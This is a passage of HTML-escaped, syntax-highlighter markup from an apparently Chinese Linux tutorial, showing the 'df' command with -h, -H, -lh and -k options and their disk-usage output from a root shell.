&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda3&lt;/span&gt;     &lt;span class=&quot;crayon-i&quot;&gt;ext3&lt;/span&gt;      &lt;span class=&quot;crayon-cn&quot;&gt;988116&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;23880&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;913232&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;boot&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c97092f873287481-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c97092f873287481-15&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;tmpfs&lt;/span&gt;        &lt;span class=&quot;crayon-i&quot;&gt;tmpfs&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;16473212&lt;/span&gt;         &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;16473212&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;shm&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0032 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;实例6：以更易读的方式显示目前磁盘空间和使用情况&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c970933879882755&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@CT1190 log]# df -h

文件系统              容量  已用 可用 已用% 挂载点

/dev/sda7              19G  871M   18G   5% /

/dev/sda9             195G   89G   96G  49% /opt

/dev/sda8             4.8G  557M  4.0G  13% /var

/dev/sda6              19G  1.9G   17G  11% /usr

/dev/sda3             965M   24M  892M   3% /boot

tmpfs                  16G     0   16G   0% /dev/shm

[root@CT1190 log]# df -H

文件系统               容量   已用  可用 已用% 挂载点

/dev/sda7               21G   913M    19G   5% /

/dev/sda9              209G    96G   103G  49% /opt

/dev/sda8              5.1G   584M   4.3G  13% /var

/dev/sda6               21G   2.1G    18G  11% /usr

/dev/sda3              1.1G    25M   936M   3% /boot

tmpfs                   17G      0    17G   0% /dev/shm

[root@CT1190 log]# df -lh

文件系统              容量  已用 可用 已用% 挂载点

/dev/sda7              19G  871M   18G   5% /

/dev/sda9             195G   89G   96G  49% /opt

/dev/sda8             4.8G  557M  4.0G  13% /var

/dev/sda6              19G  1.9G   17G  11% /usr

/dev/sda3             965M   24M  892M   3% /boot

tmpfs                  16G     0   16G   0% /dev/shm

[root@CT1190 log]# df -k

文件系统               1K-块        已用     可用 已用% 挂载点

/dev/sda7             19840892    890896  17925856   5% /

/dev/sda9            203727156  93292572  99918840  49% /opt

/dev/sda8              4956284    570188   4130264  13% /var

/dev/sda6             19840892   1977568  16839184  11% /usr

/dev/sda3               988116     23880    913232   3% /boot

tmpfs                 16473212         0  16473212   0% /dev/shm&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-43&quot;&gt;43&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-44&quot;&gt;44&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-45&quot;&gt;45&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-46&quot;&gt;46&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-47&quot;&gt;47&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-48&quot;&gt;48&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-49&quot;&gt;49&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-50&quot;&gt;50&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-51&quot;&gt;51&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-52&quot;&gt;52&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-53&quot;&gt;53&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-54&quot;&gt;54&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-55&quot;&gt;55&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-56&quot;&gt;56&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-57&quot;&gt;57&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-58&quot;&gt;58&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-59&quot;&gt;59&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-60&quot;&gt;60&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-61&quot;&gt;61&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970933879882755-62&quot;&gt;62&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970933879882755-63&quot;&gt;63&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;CT1190&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# df -h&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-3&quot;&gt;文件系统              容量  已用 可用 已用&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; 挂载点&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda7&lt;/span&gt;              &lt;span class=&quot;crayon-cn&quot;&gt;19G&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;871M&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;18G&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda9&lt;/span&gt;             &lt;span class=&quot;crayon-cn&quot;&gt;195G&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;89G&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;96G&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;opt&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-9&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda8&lt;/span&gt;             &lt;span class=&quot;crayon-cn&quot;&gt;4.8G&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;557M&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;4.0G&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-11&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda6&lt;/span&gt;              &lt;span class=&quot;crayon-cn&quot;&gt;19G&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;1.9G&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;17G&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;usr&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-13&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda3&lt;/span&gt;             &lt;span class=&quot;crayon-cn&quot;&gt;965M&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;24M&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;892M&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;boot&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-15&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;tmpfs&lt;/span&gt;                  &lt;span class=&quot;crayon-cn&quot;&gt;16G&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;16G&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;shm&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-17&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;CT1190&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# df -H&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-19&quot;&gt;文件系统               容量   已用  可用 已用&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; 挂载点&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-20&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-21&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda7&lt;/span&gt;               &lt;span class=&quot;crayon-cn&quot;&gt;21G&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;913M&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;19G&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-23&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda9&lt;/span&gt;              &lt;span class=&quot;crayon-cn&quot;&gt;209G&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;96G&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;103G&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;opt&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-24&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-25&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda8&lt;/span&gt;              &lt;span class=&quot;crayon-cn&quot;&gt;5.1G&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;584M&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;4.3G&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-26&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-27&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda6&lt;/span&gt;               &lt;span class=&quot;crayon-cn&quot;&gt;21G&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;2.1G&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;18G&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;usr&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-28&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-29&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda3&lt;/span&gt;              &lt;span class=&quot;crayon-cn&quot;&gt;1.1G&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;25M&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;936M&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;boot&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-30&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-31&quot;&gt;
